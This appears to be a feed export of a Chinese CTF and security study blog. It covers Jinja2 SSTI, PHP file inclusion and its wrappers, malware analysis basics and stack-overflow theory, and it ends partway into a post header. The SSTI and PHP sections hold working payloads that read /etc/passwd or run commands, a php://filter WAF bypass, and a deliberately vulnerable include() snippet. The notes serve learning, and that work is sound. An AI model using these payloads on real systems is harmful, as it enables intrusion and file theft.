    <content type="html"><![CDATA[<h1 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h1><ul><li>定义：SSTI 就是服务器端模板注入 (Server-Side Template Injection)</li><li>基础知识：例如，在jinja2模板引擎中，{ { } }是变量包裹标识符。{ { } }了并不仅仅可以传递变量，还可以执行一些简单的表达式。<span id="more"></span></li></ul><h2 id="Flask-jinja2模版漏洞"><a href="#Flask-jinja2模版漏洞" class="headerlink" title="Flask jinja2模版漏洞"></a>Flask jinja2模版漏洞</h2><p>魔术方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">__dict__ <span class="hljs-comment">#保存类实例或对象实例的属性变量键值对字典</span><br><br>__class__ <span class="hljs-comment">#返回调用的参数类型</span><br><br>__mro__ <span class="hljs-comment">#返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br>__base__<br>__bases__<br><br>__subclasses__()<span class="hljs-comment">#返回子类</span><br><br>__init__<span class="hljs-comment">#类的初始化方法</span><br><br>__globals__<span class="hljs-comment">#函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</span><br></code></pre></td></tr></table></figure><p><strong>利用方法&amp;实现思路</strong>：在python中，object类是Python中所有类的基类，如果定义没有指定继承哪个类，则默认继承object类。通过python的对象的继承来一步步实现文件读取和命令执行。</p><h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a><strong>基本步骤</strong></h3><ol><li>找到父类&lt;type ‘object’&gt;</li><li>寻找子类</li><li>找关于命令执行或者文件操作的模块</li></ol><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>拿到object类的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>]<br>[].__class__.__base__<br>[].__class__.__bases__[<span class="hljs-number">0</span>]<br><span class="hljs-comment">#具体情况感觉不一定，需要验证。利用&#x27;&#x27;.__class__.__mro__ 再确定索引</span><br></code></pre></td></tr></table></figure><p>获取子类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#object.__subclasses__()</span><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()<br></code></pre></td></tr></table></figure><p>找到object的子类warnings.catch_warnings：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#[].__class__.__base__.__subclasses__().index(warnings.catch_warnings) 该函数暂未成功实现过</span><br>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>]<span class="hljs-comment">#默认在59,但有时候会不在，可以利用循环去找，下列具体操作中有示例</span><br></code></pre></td></tr></table></figure><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>利用file类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>&#123;% if c.__name__==&#x27;file&#x27; %&#125;<br>&#123;&#123;&quot;find!&quot;&#125;&#125;<br>&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br><br></code></pre></td></tr></table></figure><p>或者还是利用catch_warnings类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;#提前找到了catch_warnings#&#125;<br>&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;, &#x27;r&#x27;).read()&#125;&#125;<br>&#123;#利用循环找catch_warnings#&#125;<br>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;      <br>&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;, &#x27;r&#x27;).read() &#125;&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;#利用循环找catch_warnings#&#125;<br>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>        &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&#x27;open(&quot;/etc/passwd&quot;, &quot;r&quot;).read()&#x27;) &#125;&#125;<br>    &#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>(有些执行命令的方式无回显，而当前方法可以看到回显)</p><p>如果catch_warnings已经找到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>如果没找到（利用循环遍历寻找）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>      &#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;<br>    &#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><p>待学习。。。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://houwenda.github.io/2020/02/22/jinja2-ssti/">https://houwenda.github.io/2020/02/22/jinja2-ssti/</a> </p><p><a href="https://zhuanlan.zhihu.com/p/93746437">https://zhuanlan.zhihu.com/p/93746437</a></p><p><a href="https://zhuanlan.zhihu.com/p/596279414">https://zhuanlan.zhihu.com/p/596279414</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf-web</category>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ctf-web-php伪协议</title>
    <link href="/2023/10/16/ctf-web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/10/16/ctf-web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞和php伪协议"><a href="#文件包含漏洞和php伪协议" class="headerlink" title="文件包含漏洞和php伪协议"></a>文件包含漏洞和php伪协议</h1><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>什么是文件包含漏洞：</p><p>为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了<strong>文件包含漏洞</strong>。</p><span id="more"></span><p>产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏洞。</p><p>文件包含示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>文件包含分为：</p><ul><li>LFI本地文件包含</li><li>RFI远程文件包含（allow_url_include）</li></ul><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=index.php<br></code></pre></td></tr></table></figure><p>简单绕过部分WAF：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index.php<br></code></pre></td></tr></table></figure><p>访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，resource&#x3D;index.php 表示目标文件为index.php</p><p><strong>转换过滤器</strong>：</p><ol><li>convert.base64-encode &amp; convert.base64-decode。即上面示例</li><li>convert.iconv.*。使用有两种方法:</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">convert.iconv.&lt;<span class="hljs-keyword">input</span>-<span class="hljs-keyword">encoding</span>&gt;.&lt;output-<span class="hljs-keyword">encoding</span>&gt; <br><span class="hljs-keyword">or</span><br>convert.iconv.&lt;<span class="hljs-keyword">input</span>-<span class="hljs-keyword">encoding</span>&gt;/&lt;output-<span class="hljs-keyword">encoding</span>&gt;<br></code></pre></td></tr></table></figure><p>支持的编码：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs txt">UCS-4*<br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE<br>UTF-32*<br>UTF-32BE*<br>UTF-32LE*<br>UTF-16*<br>UTF-16BE*<br>UTF-16LE*<br>UTF-7<br>UTF7-IMAP<br>UTF-8*<br>ASCII*<br></code></pre></td></tr></table></figure><h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>可以访问请求的原始数据的只读流，可以读取 POST 请求的参数–即可以在<strong>post data中附带上php代码</strong>。</p><p>比如，遍历当前目录下所有文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h3><p>allow_url_include和allow_url_fopen都为on的状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">data://text/plain;<span class="hljs-built_in">base64</span>,xxxx(<span class="hljs-built_in">base64</span>编码后的数据)<br></code></pre></td></tr></table></figure><p>参考链接</p><p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">https://www.php.net/manual/zh/mbstring.supported-encodings.php</a></p><p><a href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">https://blog.csdn.net/qq_44657899/article/details/109300335</a></p><p><a href="https://blog.csdn.net/cocoaiu/article/details/126319957">https://blog.csdn.net/cocoaiu/article/details/126319957</a></p><p><a href="https://www.cnblogs.com/linfangnan/p/13535097.html">https://www.cnblogs.com/linfangnan/p/13535097.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf-web</category>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析</title>
    <link href="/2023/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2023/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="1-静态分析基础技术"><a href="#1-静态分析基础技术" class="headerlink" title="1 静态分析基础技术"></a>1 静态分析基础技术</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><ol><li><p>使用反病毒软件来确认程序样本的恶意性；</p></li><li><p>使用<strong>哈希</strong>来识别恶意代码；</p></li><li><p>从文件的<strong>字符串列表</strong>、<strong>函数</strong>和<strong>文件头</strong>信息中发掘有用信息。</p><span id="more"></span></li></ol><h2 id="1-1反病毒引擎扫描"><a href="#1-1反病毒引擎扫描" class="headerlink" title="1.1反病毒引擎扫描"></a>1.1反病毒引擎扫描</h2><h2 id="1-2-哈希值分析"><a href="#1-2-哈希值分析" class="headerlink" title="1.2 哈希值分析"></a>1.2 哈希值分析</h2><p>计算md5值并进行分析</p><h2 id="1-3-查找字符串-Strings"><a href="#1-3-查找字符串-Strings" class="headerlink" title="1.3 查找字符串 Strings"></a>1.3 查找字符串 Strings</h2><ul><li>程序中的字符串就是一段可打印的字符序列，从其中会包含很多信息，比如弹出的消息，读取的位置，链接的URL等等。</li><li>使用Strings程序搜索可执行文件的字符串，通常以Unicode和ASCII格式存储。</li><li>两种类型格式都以NULL结束符，表示字符串是完整的。ASCII字符串每个字符使用一个字节，Unicode使用两个字节。</li><li>有些时候检测到的也并非是真正的字符串，可能是内存地址，CPU指令序列。</li></ul><h2 id="1-4-加壳与混淆恶意代码"><a href="#1-4-加壳与混淆恶意代码" class="headerlink" title="1.4 加壳与混淆恶意代码"></a>1.4 加壳与混淆恶意代码</h2><ul><li>如果strings搜索一个exe有很少的字符串就有可能是混淆的和加壳的。</li><li>加壳和混淆代码通常至少包含LoadLibrary和GetProcAddress函数（用来加载和使用其他函数）。</li><li>壳分为压缩壳和加密壳。</li></ul><p>文件加壳原理如下：</p><img src="https://s2.loli.net/2023/10/13/heJj67dS2GIwVyi.png" alt="image-20231013221204120" style="zoom:80%;" /><h3 id="用PEiD检测加壳"><a href="#用PEiD检测加壳" class="headerlink" title="用PEiD检测加壳"></a>用PEiD检测加壳</h3><p><img src="https://s2.loli.net/2023/10/14/sJQyBRW7ujvAmiG.png" alt="image-20231014091712010"></p><h2 id="1-5-PE文件格式"><a href="#1-5-PE文件格式" class="headerlink" title="1.5 PE文件格式"></a>1.5 PE文件格式</h2><ul><li>PE（Portable Execute）文件是Windows下可执行文件的总称，常见的有DLL，EXE，OCX，SYS等；</li><li>PE是指32位可执行文件，64位的可执行文件称为PE+或者PE32+，并非PE64；</li><li>PE文件以一个文件头开始，其中包括：代码信息、应用程序类型、所需的库函数和空间要求。</li></ul><img src="https://s2.loli.net/2023/10/14/WIoJE16B7Mf4arP.png" alt="image-20231014082433696" style="zoom:67%;" /><p><img src="https://s2.loli.net/2023/10/14/9ESYuTQnzilvWDq.png" alt="image-20231014082548506"></p><h2 id="1-6-链接库与函数"><a href="#1-6-链接库与函数" class="headerlink" title="1.6 链接库与函数"></a>1.6 链接库与函数</h2><p>导入函数相关信息都保存在PE文件中的导入表中。要找到PE文件的导入表，必须先找到data directory即<strong>数据目录</strong>。</p><ul><li><p><strong>静态链接</strong></p><p>在生成可执行程序时，就把库中的内容加入到程序中。</p></li><li><p><strong>动态链接</strong></p><p>源程序编译后得到的一组目标模块，在装入内存时釆用<strong>边装入边链接</strong>的链接方式。装入一个目标模块时，若发生一个外部模块调用，将引起装入程序去找出相应的外部目标模块，并将它装入内存，还要修改目标模中的相对地址。</p></li><li><p><strong>运行时链接</strong></p><p>有些目标模块的链接，推迟到执行时才进行。即在执行过程中，若发现一个被调用模块尚未装入内存时，由OS去找到该模块，将它装入内存，并把它连接到调用者模块上。对某些目标模块的链接，是在程序执行中需要该目标模块时才进行链接。</p><h3 id="查看链接函数"><a href="#查看链接函数" class="headerlink" title="查看链接函数"></a>查看链接函数</h3><p><strong>常见的dll程序</strong>：</p><p><img src="https://s2.loli.net/2023/10/14/uovJiMQGqW6mUp1.png" alt="image-20231014084030452"></p><p>使用<strong>dependency walker</strong>示例：</p></li></ul><p><img src="https://s2.loli.net/2023/10/14/yn4bHvJI2Y3D1AW.png" alt="image-20231014083901616"></p><p><img src="https://s2.loli.net/2023/10/14/o7VDuWFgLf51RYe.png"></p><h2 id="1-8-PE文件头与分节"><a href="#1-8-PE文件头与分节" class="headerlink" title="1.8 PE文件头与分节"></a>1.8 PE文件头与分节</h2><p><img src="https://s2.loli.net/2023/10/14/h9eCVzFjiSpu5dv.png" alt="image-20231014091306904"></p><h1 id="2-动态分析基础技术"><a href="#2-动态分析基础技术" class="headerlink" title="2 动态分析基础技术"></a>2 动态分析基础技术</h1><h2 id="2-1-沙箱"><a href="#2-1-沙箱" class="headerlink" title="2.1 沙箱"></a>2.1 沙箱</h2><h2 id="2-2-运行恶意代码"><a href="#2-2-运行恶意代码" class="headerlink" title="2.2 运行恶意代码"></a>2.2 运行恶意代码</h2><p>运行DLL：rundll32.exe</p><h2 id="2-3-进程监视器-进程浏览器"><a href="#2-3-进程监视器-进程浏览器" class="headerlink" title="2.3 进程监视器&amp;进程浏览器"></a>2.3 进程监视器&amp;进程浏览器</h2><p>使用<strong>process explorer</strong> 查看动态链接的dll</p><p><img src="https://s2.loli.net/2023/10/14/2UyGgBNuHJtR1Fv.png" alt="image-20231014093759868"></p><p><img src="https://s2.loli.net/2023/10/14/IZ8t2wgxJyODjPF.png" alt="image-20231014103612399"></p><p>使用<strong>process monitor</strong> 设置过滤查看指定进程 </p><p><img src="https://s2.loli.net/2023/10/14/OPtT72pjD3ekBmA.png" alt="image-20231014104428079"></p><p><img src="https://s2.loli.net/2023/10/14/2gVxmZKuB3Pklqs.png" alt="image-20231014104437688"></p><p>根据上例，双击第三行的regsetvalue，可以查看写入注册表的信息。</p><img src="https://s2.loli.net/2023/10/14/qy4DaLAUxJhKXMn.png" alt="image-20231014104715318" style="zoom:67%;" /><h2 id="2-4-regshot-注册表快照"><a href="#2-4-regshot-注册表快照" class="headerlink" title="2.4 regshot 注册表快照"></a>2.4 regshot 注册表快照</h2><p><img src="https://s2.loli.net/2023/10/16/VKRgTrmc2uUezlC.png" alt="image-20231014111105454"></p><h2 id="2-5-模拟网络"><a href="#2-5-模拟网络" class="headerlink" title="2.5 模拟网络"></a>2.5 模拟网络</h2><p>使用apatedns和inetsim配置本地模拟服务器</p><ul><li><p>在kali中，修改 &#x2F;etc&#x2F;inetsim&#x2F;inetsim.conf，启动inetsim</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs .conf">#192.168.109.131为INetSim安装的虚拟机IP<br>service_bind_address 192.168.109.131<br>dns_default_ip  192.168.134.109.131 <br></code></pre></td></tr></table></figure></li><li><p>在xp中，启动apatedns，配置dns reply IP为192.168.109.131（kali 的ip）</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>缓冲区溢出</title>
    <link href="/2023/10/12/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <url>/2023/10/12/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="缓冲区溢出（栈溢出）"><a href="#缓冲区溢出（栈溢出）" class="headerlink" title="缓冲区溢出（栈溢出）"></a>缓冲区溢出（栈溢出）</h1><span id="more"></span><h2 id="汇编-函数调用"><a href="#汇编-函数调用" class="headerlink" title="汇编-函数调用"></a>汇编-函数调用</h2><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><h4 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h4><ol><li><strong>参数入栈</strong>：将参数从右向左依次压入系统栈中</li><li><strong>返回地址入栈</strong>：将当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行（在调用call之后）</li><li><strong>代码区跳转</strong>：处理器从当前代码区跳转到被调用函数的入口处</li><li>栈帧调整：具体包括<br>保存当前栈帧状态值，已备后面恢复本栈帧时使用（<strong>EBP入栈</strong>）<br>将当前栈帧切换到新栈帧。（将ESP值装入EBP，更新栈帧底部）<br>给新栈帧分配空间。（把ESP减去所需空间的大小，抬高栈顶）</li><li><strong>函数内的局部变量入栈</strong></li></ol><h4 id="函数返回"><a href="#函数返回" class="headerlink" title="函数返回"></a>函数返回</h4><p>保存返回值：通常将函数的返回值保存在寄存器EAX中</p><p>弹出当前栈帧，恢复上一个栈帧：<br>具体包括：在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间<br>将当前栈帧底部保存的前栈帧<strong>EBP值弹出</strong>，弹给EBP寄存器，恢复出上一个栈帧<br>将函数<strong>返回地址弹出</strong>，弹给<strong>EIP</strong>寄存器</p><p> 跳转：按照函数返回地址跳回母函数中继续执行b</p><h4 id="三种函数调用方式"><a href="#三种函数调用方式" class="headerlink" title="三种函数调用方式"></a>三种函数调用方式</h4><ul><li><p>cdecall：默认的调用方式，调用方平衡栈。解决不定参数的栈平衡问题。</p><p>具体体现：在调用完函数后（call），<strong>add esp，xx</strong></p></li><li><p>stdcall：函数自己平衡栈</p></li><li><p>fastcall：寄存器传参，函数自己平衡栈</p></li></ul><h3 id="C语言实例分析"><a href="#C语言实例分析" class="headerlink" title="C语言实例分析"></a>C语言实例分析</h3><h4 id="C程序源码（X86-32位编译）"><a href="#C程序源码（X86-32位编译）" class="headerlink" title="C程序源码（X86-32位编译）"></a>C程序源码（X86-32位编译）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br><span class="hljs-keyword">return</span> a + b;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> j = <span class="hljs-number">16</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, add(i,j));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="每条语句对寄存器的影响情况"><a href="#每条语句对寄存器的影响情况" class="headerlink" title="每条语句对寄存器的影响情况"></a>每条语句对寄存器的影响情况</h4><p>示例：</p><table><thead><tr><th align="center">汇编</th><th align="center">影响</th><th align="center">受影响的寄存器取值</th></tr></thead><tbody><tr><td align="center">mov dword ptr [i],0Ah</td><td align="center">eip</td><td align="center">eip&#x3D;004118cc</td></tr><tr><td align="center">mov dword ptr [j],10h</td><td align="center">eip</td><td align="center">eip&#x3D;004118D3</td></tr><tr><td align="center">mov eax,dword ptr [j]</td><td align="center">eax</td><td align="center">eax&#x3D;00000010</td></tr><tr><td align="center">push eax</td><td align="center">esp&#x3D;esp-4</td><td align="center">esp&#x3D;0019fdfc</td></tr><tr><td align="center">mov ecx,dwordptr [i]</td><td align="center">ecx</td><td align="center">ecx&#x3D;0000000a</td></tr><tr><td align="center">push ecx</td><td align="center">esp&#x3D;esp-4</td><td align="center">esp&#x3D;0019fdf8</td></tr><tr><td align="center">call _add (0411023h)</td><td align="center">esp&#x3D;esp-4</td><td align="center">esp&#x3D;0019fdf4</td></tr><tr><td align="center">push ebp</td><td align="center">esp&#x3D;esp-4</td><td align="center">esp&#x3D;0019fdf0</td></tr><tr><td align="center">mov ebp,esp</td><td align="center">ebp&#x3D;esp</td><td align="center">ebp&#x3D;0019fdf0</td></tr><tr><td align="center">mov eax,dword ptr [a]</td><td align="center">eax</td><td align="center">eax&#x3D;0000000a</td></tr><tr><td align="center">add eax,dword ptr [b]</td><td align="center">eax&#x3D;eax+16</td><td align="center">eax&#x3D;0000001a</td></tr><tr><td align="center">mov esp,ebp</td><td align="center">esp&#x3D;ebp</td><td align="center">esp&#x3D;0019fdf0</td></tr><tr><td align="center">pop ebp</td><td align="center">esp&#x3D;esp+4;ebp</td><td align="center">esp&#x3D;0019fdf4;ebp&#x3D;0019fee4</td></tr><tr><td align="center">ret</td><td align="center">eip;esp&#x3D;esp+4</td><td align="center">eip&#x3D;004118e0;esp&#x3D;0019fdf8</td></tr><tr><td align="center">add esp,8</td><td align="center">esp&#x3D;esp+8</td><td align="center">esp&#x3D;0019fe00</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h3><p>当程序运行时，计算机会在内存区域中开辟一段连续的内存块，包括代码段、数据段和堆栈段三部分。</p><p><img src="https://s2.loli.net/2023/10/12/1YpmFTXMvhksjLx.png" alt="image-20231012174638214"></p><p>程序在内存中的存放形式如下图。</p><img src="https://s2.loli.net/2023/10/12/lfHpyKtexSC4oq1.png" alt="image-20231012174726881" style="zoom: 75%;" /><img src="https://s2.loli.net/2023/10/12/NxS5aRwYLUHsAuv.png" alt="image-20231012175036478" style="zoom:75%;" /><h3 id="函数调用-栈的变化"><a href="#函数调用-栈的变化" class="headerlink" title="函数调用&amp;栈的变化"></a>函数调用&amp;栈的变化</h3><p>当一个函数被调用时，栈中压入情况如下：</p><p><img src="https://s2.loli.net/2023/10/12/YxiulWDVBF9fSZw.png" alt="image-20231012175204933"></p><p>在局部变量往高，是前一个调用函数的EBP，接下来就是返回地址。 如果局部变量发生溢出，很有可能会覆盖掉EBP甚至RET(返回地址)，这就是缓冲区溢出攻击的“奥秘”所在。 </p><p>程序中发生函数调用时，计算机做如下操作：</p><ol><li>首先把指令寄存器EIP（它指向当前CPU将要运行的下一条指令的地址）中的内容压入栈，作为程序的返回地址（下文中用RET表示）；</li><li>之后放入栈的是基址寄存器EBP，它指向当前函数栈帧（stack frame）的底部；</li><li>然后把当前的栈指针ESP拷贝到EBP，作为新的基地址，最后为本地变量的动态存储分配留出一定空间，并把ESP减去适当的数值。</li></ol><h3 id="溢出攻击的基本流程"><a href="#溢出攻击的基本流程" class="headerlink" title="溢出攻击的基本流程"></a>溢出攻击的基本流程</h3><p><img src="https://s2.loli.net/2023/10/12/hQ2SNwo9XJYKskO.png" alt="image-20231012180726395"></p><p>关键技术：</p><ul><li><p>溢出点定位</p><p>探测法；反汇编分析</p></li><li><p>覆盖执行控制地址</p><p>覆盖返回地址</p></li><li><p>覆盖异常处理结构</p></li><li><p>跳转地址的确定</p></li><li><p>Shellcode定位和跳转</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>爆破-token绕过</title>
    <link href="/2023/10/03/%E7%88%86%E7%A0%B4-token%E7%BB%95%E8%BF%87/"/>
    <url>/2023/10/03/%E7%88%86%E7%A0%B4-token%E7%BB%95%E8%BF%87/</url>
    
